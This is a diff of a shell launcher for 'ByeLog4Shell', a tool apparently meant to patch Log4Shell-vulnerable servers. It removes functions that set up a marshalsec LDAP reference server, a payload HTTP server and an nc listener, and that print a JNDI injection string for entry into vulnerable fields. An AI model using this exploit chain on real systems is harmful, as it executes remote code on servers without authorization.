@@ -10,59 +10,11 @@ usage() {
   	$0 -i | --install | Install ByeLog4Shell and its Dependencies
   	$0 -s [URL] | --scan [URL] | Scan an Website for Log4Shell Vulnerability
         $0 -rp | --run-persistent | Run ByeLog4Shell in Persistent mode
-        $0 -rt | --run-transient | Run ByeLog4Shell in Transient mode
-        $0 -irt | --install-run-transient | Install and run ByeLog4Shell in Transient mode
-        $0 -irp | --install-run-persistent | Install and run ByeLog4Shell in Persistent mode" 1>&2 
+        $0 -rt | --run-transient | Run ByeLog4Shell in Transient mode" 1>&2 
 }
 exit_abnormal() {                        
   usage
   exit 1
-}
-irunp() {
-echo Installing and Running ByeLog4Shell in Persistent Mode
-sudo apt install -y maven netcat-traditional gnome-terminal python3
-cd ByeLog4ShellScanner
-sudo pip3 install -r requirements.txt
-cd ..
-cd ByeLog4ShellVaccinator
-mvn package
-cd ..
-cd byelog4shellserver
-mvn package -DskipTests
-cd ..
-cd ByeLog4ShellVaccinator/target/classes
-gnome-terminal -- python3 -m http.server 8888
-cd ..
-cd ..
-cd ..
-cd byelog4shellserver/target
-gnome-terminal -- java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://0.0.0.0:8888/#Log4jRCEPersistent
-gnome-terminal -- nc -lvnp 80
-echo "Now enter "\${jndi:ldap://$(dig +short myip.opendns.com @resolver1.opendns.com):1389/a}" into a vulnerable field (such as user name) to Vaccinate a Server against Log4Shell Vulnerability"
-exit
-}
-irunt() {
-echo Installing and Running ByeLog4Shell in Transient Mode
-sudo apt install -y maven netcat-traditional gnome-terminal python3
-cd ByeLog4ShellScanner
-sudo pip3 install -r requirements.txt
-cd ..
-cd ByeLog4ShellVaccinator
-mvn package
-cd ..
-cd byelog4shellserver
-mvn package -DskipTests
-cd ..
-cd ByeLog4ShellVaccinator/target/classes
-gnome-terminal -- python3 -m http.server 8888
-cd ..
-cd ..
-cd ..
-cd byelog4shellserver/target
-gnome-terminal -- java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://0.0.0.0:8888/#Log4jRCETransient
-gnome-terminal -- nc -lvnp 80
-echo "Now enter \${jndi:ldap://$(dig +short myip.opendns.com @resolver1.opendns.com):1389/a} into a vulnerable field (such as user name) to Vaccinate a Server against Log4Shell Vulnerability"
-exit
 }
 installb() {
 echo Installing Dependencies for ByeLog4Shell
@@ -123,16 +75,6 @@ while :; do
         -rt|--run-transient)
 	echo ByeLog4Shell By Qerim Iseni09
         runt
-            exit
-            ;;
-        -irt|--install-run-transient)
-        echo ByeLog4Shell By Qerim Iseni09
-        irunt
-            exit
-            ;;
-        -irp|--install-run-persistent)
-        echo ByeLog4Shell By Qerim Iseni09
-        irunp
             exit
             ;;
         -s |--scan)
